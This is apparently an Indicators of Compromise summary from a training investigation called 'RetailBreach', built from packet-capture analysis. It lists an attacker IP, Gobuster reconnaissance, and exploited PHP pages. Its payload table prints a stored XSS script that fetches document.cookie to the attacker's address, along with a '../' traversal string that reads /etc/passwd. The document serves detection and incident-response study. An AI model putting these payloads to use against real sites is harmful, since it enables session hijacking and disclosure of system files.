# Indicators of Compromise (IOCs)

## Purpose

This document consolidates the Indicators of Compromise (IOCs) identified during the RetailBreach investigation.

These artifacts were extracted through analysis of the provided network packet capture (PCAP) using Wireshark and can be used to support threat hunting, detection engineering, incident response, and future forensic investigations.

> **Note:** Each IOC documented below is supported by evidence contained within the investigation report and associated screenshots in the **Evidence** directory.

---

# Network Indicators

| IOC Type | Value | Description |
|----------|-------|-------------|
| Attacker IP Address | `111.224.180.128` | External attacker responsible for reconnaissance, exploitation, session hijacking, and post-compromise activity. |

---

# User-Agent Indicators

| IOC Type | Value | Description |
|----------|-------|-------------|
| User-Agent | `Gobuster` | Directory brute-forcing tool used during reconnaissance to enumerate hidden application resources. |

---

# Web Application Indicators

| IOC Type | Value | Description |
|----------|-------|-------------|
| Vulnerable Page | `reviews.php` | Web application component exploited to perform Stored Cross-Site Scripting (XSS). |
| Administrative Page | `dashboard.php` | Administrative resource accessed after successful session hijacking. |
| Vulnerable Script | `log_viewer.php` | Administrative script vulnerable to Local File Inclusion (LFI). |

---

# Malicious Payloads

| IOC Type | Value | Description |
|----------|-------|-------------|
| Stored XSS Payload | `<script>fetch('http://111.224.180.128/'+document.cookie);</script>` | JavaScript payload used to exfiltrate authenticated session cookies. |
| Directory Traversal Payload | `../../../../../../etc/passwd` | Payload supplied to the vulnerable `file` parameter to access sensitive operating system files. |

---

# Session Indicators

| IOC Type | Value | Description |
|----------|-------|-------------|
| Session Cookie Name | `PHPSESSID` | PHP session identifier stolen from the administrator. |
| Compromised Session Token | `lqkctf24s9h9lg67teu8uevn3q` | Authenticated administrator session reused by the attacker. |

---

# File Indicators

| IOC Type | Value | Description |
|----------|-------|-------------|
| Sensitive File Accessed | `/etc/passwd` | Linux system file successfully retrieved through Local File Inclusion (LFI). |

---

## Related Documents

- `README.md` — Complete Investigation Report
- `Artifacts/MITRE-ATTACK-Mapping.md`
- `Artifacts/Challenge-Answers.md`
- `Evidence/Timeline-Evidence.md`